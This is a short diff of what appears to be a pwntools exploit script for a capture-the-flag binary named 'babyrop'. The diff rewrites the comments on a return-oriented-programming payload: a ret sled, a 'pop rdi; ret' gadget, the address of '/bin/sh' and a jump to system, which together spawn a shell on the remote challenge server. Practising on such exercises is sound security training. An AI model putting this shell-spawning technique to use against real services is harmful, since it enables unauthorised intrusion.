@@ -46,10 +46,10 @@ PORT = 5012
 BINARY = "./babyrop"
 BABYROP = ELF('./babyrop')
 
-PAYLOAD =  p64(0x0000000000400486) * 8  # RET x 8 (POP)
-PAYLOAD += p64(0x0000000000400683)      # PUSH
-PAYLOAD += p64(0x004006a4)              # address of "/bin/sh"
-PAYLOAD += p64(BABYROP.plt['system'])   # CALL 'system'
+PAYLOAD =  p64(0x0000000000400486) * 8  # ret * 8
+PAYLOAD += p64(0x0000000000400683)      # pop rdi ; ret
+PAYLOAD += p64(0x004006a4)              # s_/bin/sh_004006a4
+PAYLOAD += p64(BABYROP.plt['system'])   # JMP 'system'
 
 r = remote(HOST, PORT)  # server
 # r = process(BINARY)   # local
